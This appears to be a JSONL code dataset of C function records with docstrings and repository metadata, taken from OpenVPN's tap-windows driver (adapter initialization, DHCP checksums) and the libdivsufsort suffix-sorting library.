{"docstring": "//==========================================================\n//                            Adapter Initialization\n//==========================================================\n", "func_signal": "NDIS_STATUS AdapterCreate\n(OUT PNDIS_STATUS p_ErrorStatus,\n OUT PUINT p_MediaIndex,\n IN PNDIS_MEDIUM p_Media,\n IN UINT p_MediaCount,\n IN NDIS_HANDLE p_AdapterHandle,\n IN NDIS_HANDLE p_ConfigurationHandle)", "code": "{\n  TapAdapterPointer l_Adapter = NULL;\n\n  NDIS_MEDIUM l_PreferredMedium = NdisMedium802_3; // Ethernet\n  BOOLEAN l_MacFromRegistry = FALSE;\n  UINT l_Index;\n  NDIS_STATUS status;\n\n#if ENABLE_NONADMIN\n  BOOLEAN enable_non_admin = FALSE;\n#endif\n\n  DEBUGP ((\"[TAP] AdapterCreate called\\n\"));\n\n  //====================================\n  // Make sure adapter type is supported\n  //====================================\n\n  for (l_Index = 0;\n       l_Index < p_MediaCount && p_Media[l_Index] != l_PreferredMedium;\n       ++l_Index);\n\n  if (l_Index == p_MediaCount)\n    {\n      DEBUGP ((\"[TAP] Unsupported adapter type [wanted: %d]\\n\",\n\t       l_PreferredMedium));\n      return NDIS_STATUS_UNSUPPORTED_MEDIA;\n    }\n\n  *p_MediaIndex = l_Index;\n\n  //=========================================\n  // Allocate memory for TapAdapter structure\n  //=========================================\n\n  l_Adapter = MemAlloc (sizeof (TapAdapter), TRUE);\n\n  if (l_Adapter == NULL)\n    {\n      DEBUGP ((\"[TAP] Couldn't allocate adapter memory\\n\"));\n      return NDIS_STATUS_RESOURCES;\n    }\n\n  //==========================================\n  // Inform the NDIS library about significant\n  // features of our virtual NIC.\n  //==========================================\n\n  NdisMSetAttributesEx\n    (p_AdapterHandle,\n     (NDIS_HANDLE) l_Adapter,\n     16,\n     NDIS_ATTRIBUTE_DESERIALIZE\n     | NDIS_ATTRIBUTE_IGNORE_PACKET_TIMEOUT\n     | NDIS_ATTRIBUTE_IGNORE_REQUEST_TIMEOUT\n     | NDIS_ATTRIBUTE_NO_HALT_ON_SUSPEND,\n     NdisInterfaceInternal);\n\n  //=====================================\n  // Initialize simple Adapter parameters\n  //=====================================\n\n  l_Adapter->m_Lookahead = DEFAULT_PACKET_LOOKAHEAD;\n  l_Adapter->m_Medium = l_PreferredMedium;\n  l_Adapter->m_DeviceState = '?';\n  l_Adapter->m_MiniportAdapterHandle = p_AdapterHandle;\n\n  //==================================\n  // Allocate spinlock for controlling\n  // access to multicast address list.\n  //==================================\n  NdisAllocateSpinLock (&l_Adapter->m_MCLock);\n  l_Adapter->m_MCLockAllocated = TRUE;\n\n  //====================================================\n  // Register a shutdown handler which will be called\n  // on system restart/shutdown to halt our virtual NIC.\n  //====================================================\n\n  NdisMRegisterAdapterShutdownHandler (p_AdapterHandle, l_Adapter,\n\t\t\t\t       AdapterHalt);\n  l_Adapter->m_RegisteredAdapterShutdownHandler = TRUE;\n\n  //============================================\n  // Get parameters from registry which were set\n  // in the adapter advanced properties dialog.\n  //============================================\n  {\n    NDIS_STATUS status;\n    NDIS_HANDLE configHandle;\n    NDIS_CONFIGURATION_PARAMETER *parm;\n\n    // set defaults in case our registry query fails\n    l_Adapter->m_MTU = ETHERNET_MTU;\n    l_Adapter->m_MediaStateAlwaysConnected = FALSE;\n    l_Adapter->m_MediaState = FALSE;\n\n    NdisOpenConfiguration (&status, &configHandle, p_ConfigurationHandle);\n    if (status != NDIS_STATUS_SUCCESS)\n      {\n\tDEBUGP ((\"[TAP] Couldn't open adapter registry\\n\"));\n\tAdapterFreeResources (l_Adapter);\n\treturn status;\n      }\n\n    //====================================\n    // Allocate and construct adapter name\n    //====================================\n    {\n      \n      NDIS_STRING mkey = NDIS_STRING_CONST(\"MiniportName\");\n      NDIS_STRING vkey = NDIS_STRING_CONST(\"NdisVersion\");\n      NDIS_STATUS vstatus;\n      NDIS_CONFIGURATION_PARAMETER *vparm;\n\n      NdisReadConfiguration (&vstatus, &vparm, configHandle, &vkey, NdisParameterInteger);\n      if (vstatus == NDIS_STATUS_SUCCESS)\n\tDEBUGP ((\"[TAP] NdisReadConfiguration NdisVersion=%X\\n\", vparm->ParameterData.IntegerData));\n\n      NdisReadConfiguration (&status, &parm, configHandle, &mkey, NdisParameterString);\n      if (status == NDIS_STATUS_SUCCESS)\n\t{\n\t  if (parm->ParameterType == NdisParameterString)\n\t    {\n\t      DEBUGP ((\"[TAP] NdisReadConfiguration (MiniportName=%.*S)\\n\",\n\t\t       parm->ParameterData.StringData.Length/2,\n\t\t       parm->ParameterData.StringData.Buffer));\n\n\t      if (RtlUnicodeStringToAnsiString (\n\t\t\t\t\t\t&l_Adapter->m_NameAnsi,\n\t\t\t\t\t\t&parm->ParameterData.StringData,\n\t\t\t\t\t\tTRUE) != STATUS_SUCCESS)\n\t\t{\n\t\t  DEBUGP ((\"[TAP] MiniportName failed\\n\"));\n\t\t  status = NDIS_STATUS_RESOURCES;\n\t\t}\n\t    }\n\t}\n      else\n\t{\n\t  /* \"MiniportName\" is available only XP and above.  Not on Windows 2000. */\n\t  if (vstatus == NDIS_STATUS_SUCCESS && vparm->ParameterData.IntegerData == 0x50000)\n\t    {\n\t      /* Fallback for Windows 2000 with NDIS version 5.00.00\n\t\t Don't use this on Vista, 'NDIS_MINIPORT_BLOCK' was changed! */\n\t      if (RtlUnicodeStringToAnsiString (&l_Adapter->m_NameAnsi,\n\t\t\t\t\t\t&((struct WIN2K_NDIS_MINIPORT_BLOCK *) p_AdapterHandle)->MiniportName,\n\t\t\t\t\t\tTRUE) != STATUS_SUCCESS)\n\t\t{\n\t\t  DEBUGP ((\"[TAP] MiniportName (W2K) failed\\n\"));\n\t\t  status = NDIS_STATUS_RESOURCES;\n\t\t}\n\t      else\n\t\t{\n\t\t  DEBUGP ((\"[TAP] MiniportName (W2K) succeeded: %s\\n\", l_Adapter->m_NameAnsi.Buffer));\n\t\t  status = NDIS_STATUS_SUCCESS;\n\t\t}\n\t    }\n\t}\n    }\n\n    /* Can't continue without name (see macro 'NAME') */\n    if (status != NDIS_STATUS_SUCCESS || !l_Adapter->m_NameAnsi.Buffer)\n      {\n\tNdisCloseConfiguration (configHandle);\n\tAdapterFreeResources (l_Adapter);\n\tDEBUGP ((\"[TAP] failed to get miniport name\\n\"));\n\treturn NDIS_STATUS_RESOURCES;\n      }\n\n    /* Read MTU setting from registry */\n    {\n      NDIS_STRING key = NDIS_STRING_CONST(\"MTU\");\n      NdisReadConfiguration (&status, &parm, configHandle,\n\t\t\t     &key, NdisParameterInteger);\n      if (status == NDIS_STATUS_SUCCESS)\n\t{\n\t  if (parm->ParameterType == NdisParameterInteger)\n\t    {\n\t      int mtu = parm->ParameterData.IntegerData;\n\t      if (mtu < MINIMUM_MTU)\n\t\tmtu = MINIMUM_MTU;\n\t      if (mtu > MAXIMUM_MTU)\n\t\tmtu = MAXIMUM_MTU;\n\t      l_Adapter->m_MTU = mtu;\n\t    }\n\t}\n    }\n\n    /* Read Media Status setting from registry */\n    {\n      NDIS_STRING key = NDIS_STRING_CONST(\"MediaStatus\");\n      NdisReadConfiguration (&status, &parm, configHandle,\n\t\t\t     &key, NdisParameterInteger);\n      if (status == NDIS_STATUS_SUCCESS)\n\t{\n\t  if (parm->ParameterType == NdisParameterInteger)\n\t    {\n\t      if (parm->ParameterData.IntegerData)\n\t\t{\n\t\t  l_Adapter->m_MediaStateAlwaysConnected = TRUE;\n\t\t  l_Adapter->m_MediaState = TRUE;\n\t\t}\n\t    }\n\t}\n    }\n\n#if ENABLE_NONADMIN\n    /* Read AllowNonAdmin setting from registry */\n    {\n      NDIS_STRING key = NDIS_STRING_CONST(\"AllowNonAdmin\");\n      NdisReadConfiguration (&status, &parm, configHandle,\n\t\t\t     &key, NdisParameterInteger);\n      if (status == NDIS_STATUS_SUCCESS)\n\t{\n\t  if (parm->ParameterType == NdisParameterInteger)\n\t    {\n\t      if (parm->ParameterData.IntegerData)\n\t\t{\n\t\t  enable_non_admin = TRUE;\n\t\t}\n\t    }\n\t}\n    }\n#endif\n\n    /* Read optional MAC setting from registry */\n    {\n      NDIS_STRING key = NDIS_STRING_CONST(\"MAC\");\n      ANSI_STRING mac_string;\n      NdisReadConfiguration (&status, &parm, configHandle,\n\t\t\t     &key, NdisParameterString);\n      if (status == NDIS_STATUS_SUCCESS)\n\t{\n\t  if (parm->ParameterType == NdisParameterString)\n\t    {\n\t      if (RtlUnicodeStringToAnsiString (&mac_string, &parm->ParameterData.StringData, TRUE) == STATUS_SUCCESS)\n\t\t{\n\t\t  l_MacFromRegistry = ParseMAC (l_Adapter->m_MAC, mac_string.Buffer);\n\t\t  RtlFreeAnsiString (&mac_string);\n\t\t}\n\t    }\n\t}\n    }\n\n    NdisCloseConfiguration (configHandle);\n\n    DEBUGP ((\"[%s] MTU=%d\\n\", NAME (l_Adapter), l_Adapter->m_MTU));\n  }\n\n  //==================================\n  // Store and update MAC address info\n  //==================================\n\n  if (!l_MacFromRegistry)\n    GenerateRandomMac (l_Adapter->m_MAC, NAME (l_Adapter));\n\n  DEBUGP ((\"[%s] Using MAC %x:%x:%x:%x:%x:%x\\n\",\n\t   NAME (l_Adapter),\n\t   l_Adapter->m_MAC[0], l_Adapter->m_MAC[1], l_Adapter->m_MAC[2],\n\t   l_Adapter->m_MAC[3], l_Adapter->m_MAC[4], l_Adapter->m_MAC[5]));\n\n  //==================\n  // Set broadcast MAC\n  //==================\n  {\n    int i;\n    for (i = 0; i < sizeof (MACADDR); ++i)\n      l_Adapter->m_MAC_Broadcast[i] = 0xFF;\n  }\n\n  //====================================\n  // Initialize TAP device\n  //====================================\n  {\n    NDIS_STATUS tap_status;\n    tap_status = CreateTapDevice (&l_Adapter->m_Extension, NAME (l_Adapter));\n    if (tap_status != NDIS_STATUS_SUCCESS)\n      {\n\tAdapterFreeResources (l_Adapter);\n\tDEBUGP ((\"[TAP] CreateTapDevice failed\\n\"));\n\treturn tap_status;\n      }\n  }\n\n  if (!AddAdapterToInstanceList (l_Adapter))\n    {\n      NOTE_ERROR ();\n      TapDeviceFreeResources (&l_Adapter->m_Extension);\n      AdapterFreeResources (l_Adapter);\n      DEBUGP ((\"[TAP] AddAdapterToInstanceList failed\\n\"));\n      return NDIS_STATUS_RESOURCES;\n    }\n\n  l_Adapter->m_InterfaceIsRunning = TRUE;\n\n#if ENABLE_NONADMIN\n  if (enable_non_admin)\n    AllowNonAdmin (&l_Adapter->m_Extension);\n#endif\n\n  return NDIS_STATUS_SUCCESS;\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//======================================================\n// If DHCP mode is used together with tun\n// mode, consider the fact that the P2P remote subnet\n// might enclose the DHCP masq server address.\n//======================================================\n", "func_signal": "VOID\nCheckIfDhcpAndTunMode (TapAdapterPointer p_Adapter)", "code": "{\n  if (p_Adapter->m_tun && p_Adapter->m_dhcp_enabled)\n    {\n      if ((p_Adapter->m_dhcp_server_ip & p_Adapter->m_remoteNetmask) == p_Adapter->m_remoteNetwork)\n\t{\n\t  COPY_MAC (p_Adapter->m_dhcp_server_mac, p_Adapter->m_TapToUser.dest);\n\t  p_Adapter->m_dhcp_server_arp = FALSE;\n\t}\n    }\n}", "path": "src\\tapdrvr.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "//================================\n// Set IP and UDP packet checksums\n//================================\n", "func_signal": "VOID\nSetChecksumDHCPMsg (DHCPMsg *m)", "code": "{\n  // Set IP checksum\n  m->msg.pre.ip.check = htons (ip_checksum ((UCHAR *) &m->msg.pre.ip, sizeof (IPHDR)));\n\n  // Set UDP Checksum\n  m->msg.pre.udp.check = htons (udp_checksum ((UCHAR *) &m->msg.pre.udp, \n\t\t\t\t\t      sizeof (UDPHDR) + sizeof (DHCP) + m->optlen,\n\t\t\t\t\t      (UCHAR *)&m->msg.pre.ip.saddr,\n\t\t\t\t\t      (UCHAR *)&m->msg.pre.ip.daddr));\n}", "path": "src\\dhcp.c", "repo_name": "OpenVPN/tap-windows", "stars": 349, "license": "other", "language": "c", "size": 6668}
{"docstring": "/* Substring sort */\n", "func_signal": "void\nsssort(const sauchar_t *T, const saidx_t *PA,\n       saidx_t *first, saidx_t *last,\n       saidx_t *buf, saidx_t bufsize,\n       saidx_t depth, saidx_t n, saint_t lastsuffix)", "code": "{\n  saidx_t *a;\n#if SS_BLOCKSIZE != 0\n  saidx_t *b, *middle, *curbuf;\n  saidx_t j, k, curbufsize, limit;\n#endif\n  saidx_t i;\n\n  if(lastsuffix != 0) { ++first; }\n\n#if SS_BLOCKSIZE == 0\n  ss_mintrosort(T, PA, first, last, depth);\n#else\n  if((bufsize < SS_BLOCKSIZE) &&\n      (bufsize < (last - first)) &&\n      (bufsize < (limit = ss_isqrt(last - first)))) {\n    if(SS_BLOCKSIZE < limit) { limit = SS_BLOCKSIZE; }\n    buf = middle = last - limit, bufsize = limit;\n  } else {\n    middle = last, limit = 0;\n  }\n  for(a = first, i = 0; SS_BLOCKSIZE < (middle - a); a += SS_BLOCKSIZE, ++i) {\n#if SS_INSERTIONSORT_THRESHOLD < SS_BLOCKSIZE\n    ss_mintrosort(T, PA, a, a + SS_BLOCKSIZE, depth);\n#elif 1 < SS_BLOCKSIZE\n    ss_insertionsort(T, PA, a, a + SS_BLOCKSIZE, depth);\n#endif\n    curbufsize = last - (a + SS_BLOCKSIZE);\n    curbuf = a + SS_BLOCKSIZE;\n    if(curbufsize <= bufsize) { curbufsize = bufsize, curbuf = buf; }\n    for(b = a, k = SS_BLOCKSIZE, j = i; j & 1; b -= k, k <<= 1, j >>= 1) {\n      ss_swapmerge(T, PA, b - k, b, b + k, curbuf, curbufsize, depth);\n    }\n  }\n#if SS_INSERTIONSORT_THRESHOLD < SS_BLOCKSIZE\n  ss_mintrosort(T, PA, a, middle, depth);\n#elif 1 < SS_BLOCKSIZE\n  ss_insertionsort(T, PA, a, middle, depth);\n#endif\n  for(k = SS_BLOCKSIZE; i != 0; k <<= 1, i >>= 1) {\n    if(i & 1) {\n      ss_swapmerge(T, PA, a - k, a, middle, buf, bufsize, depth);\n      a -= k;\n    }\n  }\n  if(limit != 0) {\n#if SS_INSERTIONSORT_THRESHOLD < SS_BLOCKSIZE\n    ss_mintrosort(T, PA, middle, last, depth);\n#elif 1 < SS_BLOCKSIZE\n    ss_insertionsort(T, PA, middle, last, depth);\n#endif\n    ss_inplacemerge(T, PA, first, middle, last, depth);\n  }\n#endif\n\n  if(lastsuffix != 0) {\n    /* Insert last type B* suffix. */\n    saidx_t PAi[2]; PAi[0] = PA[*(first - 1)], PAi[1] = n - 2;\n    for(a = first, i = *(first - 1);\n        (a < last) && ((*a < 0) || (0 < ss_compare(T, &(PAi[0]), PA + *a, depth)));\n        ++a) {\n      *(a - 1) = *a;\n    }\n    *(a - 1) = i;\n  }\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Simple insertionsort for small size groups. */\n", "func_signal": "static\nvoid\ntr_insertionsort(const saidx_t *ISAd, saidx_t *first, saidx_t *last)", "code": "{\n  saidx_t *a, *b;\n  saidx_t t, r;\n\n  for(a = first + 1; a < last; ++a) {\n    for(t = *a, b = a - 1; 0 > (r = ISAd[t] - ISAd[*b]);) {\n      do { *(b + 1) = *b; } while((first <= --b) && (*b < 0));\n      if(b < first) { break; }\n    }\n    if(r == 0) { *b = ~*b; }\n    *(b + 1) = t;\n  }\n}", "path": "lib\\trsort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Compares two suffixes. */\n", "func_signal": "static INLINE\nsaint_t\nss_compare(const sauchar_t *T,\n           const saidx_t *p1, const saidx_t *p2,\n           saidx_t depth)", "code": "{\n  const sauchar_t *U1, *U2, *U1n, *U2n;\n\n  for(U1 = T + depth + *p1,\n      U2 = T + depth + *p2,\n      U1n = T + *(p1 + 1) + 2,\n      U2n = T + *(p2 + 1) + 2;\n      (U1 < U1n) && (U2 < U2n) && (*U1 == *U2);\n      ++U1, ++U2) {\n  }\n\n  return U1 < U1n ?\n        (U2 < U2n ? *U1 - *U2 : 1) :\n        (U2 < U2n ? -1 : 0);\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Insertionsort for small size groups */\n", "func_signal": "static\nvoid\nss_insertionsort(const sauchar_t *T, const saidx_t *PA,\n                 saidx_t *first, saidx_t *last, saidx_t depth)", "code": "{\n  saidx_t *i, *j;\n  saidx_t t;\n  saint_t r;\n\n  for(i = last - 2; first <= i; --i) {\n    for(t = *i, j = i + 1; 0 < (r = ss_compare(T, PA + t, PA + *j, depth));) {\n      do { *(j - 1) = *j; } while((++j < last) && (*j < 0));\n      if(last <= j) { break; }\n    }\n    if(r == 0) { *j = ~*j; }\n    *(j - 1) = t;\n  }\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Tandem repeat sort */\n", "func_signal": "void\ntrsort(saidx_t *ISA, saidx_t *SA, saidx_t n, saidx_t depth)", "code": "{\n  saidx_t *ISAd;\n  saidx_t *first, *last;\n  trbudget_t budget;\n  saidx_t t, skip, unsorted;\n\n  trbudget_init(&budget, tr_ilg(n) * 2 / 3, n);\n/*  trbudget_init(&budget, tr_ilg(n) * 3 / 4, n); */\n  for(ISAd = ISA + depth; -n < *SA; ISAd += ISAd - ISA) {\n    first = SA;\n    skip = 0;\n    unsorted = 0;\n    do {\n      if((t = *first) < 0) { first -= t; skip += t; }\n      else {\n        if(skip != 0) { *(first + skip) = skip; skip = 0; }\n        last = SA + ISA[t] + 1;\n        if(1 < (last - first)) {\n          budget.count = 0;\n          tr_introsort(ISA, ISAd, SA, first, last, &budget);\n          if(budget.count != 0) { unsorted += budget.count; }\n          else { skip = first - last; }\n        } else if((last - first) == 1) {\n          skip = -1;\n        }\n        first = last;\n      }\n    } while(first < (SA + n));\n    if(skip != 0) { *(first + skip) = skip; }\n    if(unsorted == 0) { break; }\n  }\n}", "path": "lib\\trsort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Merge-forward with internal buffer. */\n", "func_signal": "static\nvoid\nss_mergeforward(const sauchar_t *T, const saidx_t *PA,\n                saidx_t *first, saidx_t *middle, saidx_t *last,\n                saidx_t *buf, saidx_t depth)", "code": "{\n  saidx_t *a, *b, *c, *bufend;\n  saidx_t t;\n  saint_t r;\n\n  bufend = buf + (middle - first) - 1;\n  ss_blockswap(buf, first, middle - first);\n\n  for(t = *(a = first), b = buf, c = middle;;) {\n    r = ss_compare(T, PA + *b, PA + *c, depth);\n    if(r < 0) {\n      do {\n        *a++ = *b;\n        if(bufend <= b) { *bufend = t; return; }\n        *b++ = *a;\n      } while(*b < 0);\n    } else if(r > 0) {\n      do {\n        *a++ = *c, *c++ = *a;\n        if(last <= c) {\n          while(b < bufend) { *a++ = *b, *b++ = *a; }\n          *a = *b, *b = t;\n          return;\n        }\n      } while(*c < 0);\n    } else {\n      *c = ~*c;\n      do {\n        *a++ = *b;\n        if(bufend <= b) { *bufend = t; return; }\n        *b++ = *a;\n      } while(*b < 0);\n\n      do {\n        *a++ = *c, *c++ = *a;\n        if(last <= c) {\n          while(b < bufend) { *a++ = *b, *b++ = *a; }\n          *a = *b, *b = t;\n          return;\n        }\n      } while(*c < 0);\n    }\n  }\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Checks the suffix array SA of the string T. */\n", "func_signal": "saint_t\nsufcheck(const sauchar_t *T, const saidx_t *SA,\n         saidx_t n, saint_t verbose)", "code": "{\n  saidx_t C[ALPHABET_SIZE];\n  saidx_t i, p, q, t;\n  saint_t c;\n\n  if(verbose) { fprintf(stderr, \"sufcheck: \"); }\n\n  /* Check arguments. */\n  if((T == NULL) || (SA == NULL) || (n < 0)) {\n    if(verbose) { fprintf(stderr, \"Invalid arguments.\\n\"); }\n    return -1;\n  }\n  if(n == 0) {\n    if(verbose) { fprintf(stderr, \"Done.\\n\"); }\n    return 0;\n  }\n\n  /* check range: [0..n-1] */\n  for(i = 0; i < n; ++i) {\n    if((SA[i] < 0) || (n <= SA[i])) {\n      if(verbose) {\n        fprintf(stderr, \"Out of the range [0,%\" PRIdSAIDX_T \"].\\n\"\n                        \"  SA[%\" PRIdSAIDX_T \"]=%\" PRIdSAIDX_T \"\\n\",\n                        n - 1, i, SA[i]);\n      }\n      return -2;\n    }\n  }\n\n  /* check first characters. */\n  for(i = 1; i < n; ++i) {\n    if(T[SA[i - 1]] > T[SA[i]]) {\n      if(verbose) {\n        fprintf(stderr, \"Suffixes in wrong order.\\n\"\n                        \"  T[SA[%\" PRIdSAIDX_T \"]=%\" PRIdSAIDX_T \"]=%d\"\n                        \" > T[SA[%\" PRIdSAIDX_T \"]=%\" PRIdSAIDX_T \"]=%d\\n\",\n                        i - 1, SA[i - 1], T[SA[i - 1]], i, SA[i], T[SA[i]]);\n      }\n      return -3;\n    }\n  }\n\n  /* check suffixes. */\n  for(i = 0; i < ALPHABET_SIZE; ++i) { C[i] = 0; }\n  for(i = 0; i < n; ++i) { ++C[T[i]]; }\n  for(i = 0, p = 0; i < ALPHABET_SIZE; ++i) {\n    t = C[i];\n    C[i] = p;\n    p += t;\n  }\n\n  q = C[T[n - 1]];\n  C[T[n - 1]] += 1;\n  for(i = 0; i < n; ++i) {\n    p = SA[i];\n    if(0 < p) {\n      c = T[--p];\n      t = C[c];\n    } else {\n      c = T[p = n - 1];\n      t = q;\n    }\n    if((t < 0) || (p != SA[t])) {\n      if(verbose) {\n        fprintf(stderr, \"Suffix in wrong position.\\n\"\n                        \"  SA[%\" PRIdSAIDX_T \"]=%\" PRIdSAIDX_T \" or\\n\"\n                        \"  SA[%\" PRIdSAIDX_T \"]=%\" PRIdSAIDX_T \"\\n\",\n                        t, (0 <= t) ? SA[t] : -1, i, SA[i]);\n      }\n      return -4;\n    }\n    if(t != q) {\n      ++C[c];\n      if((n <= C[c]) || (T[SA[C[c]]] != c)) { C[c] = -1; }\n    }\n  }\n\n  if(1 <= verbose) { fprintf(stderr, \"Done.\\n\"); }\n  return 0;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Simple top-down heapsort. */\n", "func_signal": "static\nvoid\nss_heapsort(const sauchar_t *Td, const saidx_t *PA, saidx_t *SA, saidx_t size)", "code": "{\n  saidx_t i, m;\n  saidx_t t;\n\n  m = size;\n  if((size % 2) == 0) {\n    m--;\n    if(Td[PA[SA[m / 2]]] < Td[PA[SA[m]]]) { SWAP(SA[m], SA[m / 2]); }\n  }\n\n  for(i = m / 2 - 1; 0 <= i; --i) { ss_fixdown(Td, PA, SA, i, m); }\n  if((size % 2) == 0) { SWAP(SA[0], SA[m]); ss_fixdown(Td, PA, SA, 0, m); }\n  for(i = m - 1; 0 < i; --i) {\n    t = SA[0], SA[0] = SA[i];\n    ss_fixdown(Td, PA, SA, 0, i);\n    SA[i] = t;\n  }\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Binary partition for substrings. */\n", "func_signal": "static INLINE\nsaidx_t *\nss_partition(const saidx_t *PA,\n                    saidx_t *first, saidx_t *last, saidx_t depth)", "code": "{\n  saidx_t *a, *b;\n  saidx_t t;\n  for(a = first - 1, b = last;;) {\n    for(; (++a < b) && ((PA[*a] + depth) >= (PA[*a + 1] + 1));) { *a = ~*a; }\n    for(; (a < --b) && ((PA[*b] + depth) <  (PA[*b + 1] + 1));) { }\n    if(b <= a) { break; }\n    t = ~*b;\n    *b = *a;\n    *a = t;\n  }\n  if(first < a) { *first = ~*first; }\n  return a;\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Binary search for inverse bwt. */\n", "func_signal": "static\nsaidx_t\nbinarysearch_lower(const saidx_t *A, saidx_t size, saidx_t value)", "code": "{\n  saidx_t half, i;\n  for(i = 0, half = size >> 1;\n      0 < size;\n      size = half, half >>= 1) {\n    if(A[i + half] < value) {\n      i += half + 1;\n      half -= (size & 1) ^ 1;\n    }\n  }\n  return i;\n}", "path": "lib\\utils.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* Returns the pivot element. */\n", "func_signal": "static INLINE\nsaidx_t *\ntr_pivot(const saidx_t *ISAd, saidx_t *first, saidx_t *last)", "code": "{\n  saidx_t *middle;\n  saidx_t t;\n\n  t = last - first;\n  middle = first + t / 2;\n\n  if(t <= 512) {\n    if(t <= 32) {\n      return tr_median3(ISAd, first, middle, last - 1);\n    } else {\n      t >>= 2;\n      return tr_median5(ISAd, first, first + t, middle, last - 1 - t, last - 1);\n    }\n  }\n  t >>= 3;\n  first  = tr_median3(ISAd, first, first + t, first + (t << 1));\n  middle = tr_median3(ISAd, middle - t, middle, middle + t);\n  last   = tr_median3(ISAd, last - 1 - (t << 1), last - 1 - t, last - 1);\n  return tr_median3(ISAd, first, middle, last);\n}", "path": "lib\\trsort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/*---------------------------------------------------------------------------*/\n", "func_signal": "static INLINE\nvoid\ntr_fixdown(const saidx_t *ISAd, saidx_t *SA, saidx_t i, saidx_t size)", "code": "{\n  saidx_t j, k;\n  saidx_t v;\n  saidx_t c, d, e;\n\n  for(v = SA[i], c = ISAd[v]; (j = 2 * i + 1) < size; SA[i] = SA[k], i = k) {\n    d = ISAd[SA[k = j++]];\n    if(d < (e = ISAd[SA[j]])) { k = j; d = e; }\n    if(d <= c) { break; }\n  }\n  SA[i] = v;\n}", "path": "lib\\trsort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
{"docstring": "/* D&C based merge. */\n", "func_signal": "static\nvoid\nss_swapmerge(const sauchar_t *T, const saidx_t *PA,\n             saidx_t *first, saidx_t *middle, saidx_t *last,\n             saidx_t *buf, saidx_t bufsize, saidx_t depth)", "code": "{\n#define STACK_SIZE SS_SMERGE_STACKSIZE\n#define GETIDX(a) ((0 <= (a)) ? (a) : (~(a)))\n#define MERGE_CHECK(a, b, c)\\\n  do {\\\n    if(((c) & 1) ||\\\n       (((c) & 2) && (ss_compare(T, PA + GETIDX(*((a) - 1)), PA + *(a), depth) == 0))) {\\\n      *(a) = ~*(a);\\\n    }\\\n    if(((c) & 4) && ((ss_compare(T, PA + GETIDX(*((b) - 1)), PA + *(b), depth) == 0))) {\\\n      *(b) = ~*(b);\\\n    }\\\n  } while(0)\n  struct { saidx_t *a, *b, *c; saint_t d; } stack[STACK_SIZE];\n  saidx_t *l, *r, *lm, *rm;\n  saidx_t m, len, half;\n  saint_t ssize;\n  saint_t check, next;\n\n  for(check = 0, ssize = 0;;) {\n    if((last - middle) <= bufsize) {\n      if((first < middle) && (middle < last)) {\n        ss_mergebackward(T, PA, first, middle, last, buf, depth);\n      }\n      MERGE_CHECK(first, last, check);\n      STACK_POP(first, middle, last, check);\n      continue;\n    }\n\n    if((middle - first) <= bufsize) {\n      if(first < middle) {\n        ss_mergeforward(T, PA, first, middle, last, buf, depth);\n      }\n      MERGE_CHECK(first, last, check);\n      STACK_POP(first, middle, last, check);\n      continue;\n    }\n\n    for(m = 0, len = MIN(middle - first, last - middle), half = len >> 1;\n        0 < len;\n        len = half, half >>= 1) {\n      if(ss_compare(T, PA + GETIDX(*(middle + m + half)),\n                       PA + GETIDX(*(middle - m - half - 1)), depth) < 0) {\n        m += half + 1;\n        half -= (len & 1) ^ 1;\n      }\n    }\n\n    if(0 < m) {\n      lm = middle - m, rm = middle + m;\n      ss_blockswap(lm, middle, m);\n      l = r = middle, next = 0;\n      if(rm < last) {\n        if(*rm < 0) {\n          *rm = ~*rm;\n          if(first < lm) { for(; *--l < 0;) { } next |= 4; }\n          next |= 1;\n        } else if(first < lm) {\n          for(; *r < 0; ++r) { }\n          next |= 2;\n        }\n      }\n\n      if((l - first) <= (last - r)) {\n        STACK_PUSH(r, rm, last, (next & 3) | (check & 4));\n        middle = lm, last = l, check = (check & 3) | (next & 4);\n      } else {\n        if((next & 2) && (r == middle)) { next ^= 6; }\n        STACK_PUSH(first, lm, l, (check & 3) | (next & 4));\n        first = r, middle = rm, check = (next & 3) | (check & 4);\n      }\n    } else {\n      if(ss_compare(T, PA + GETIDX(*(middle - 1)), PA + *middle, depth) == 0) {\n        *middle = ~*middle;\n      }\n      MERGE_CHECK(first, last, check);\n      STACK_POP(first, middle, last, check);\n    }\n  }\n#undef STACK_SIZE\n}", "path": "lib\\sssort.c", "repo_name": "y-256/libdivsufsort", "stars": 329, "license": "mit", "language": "c", "size": 264}
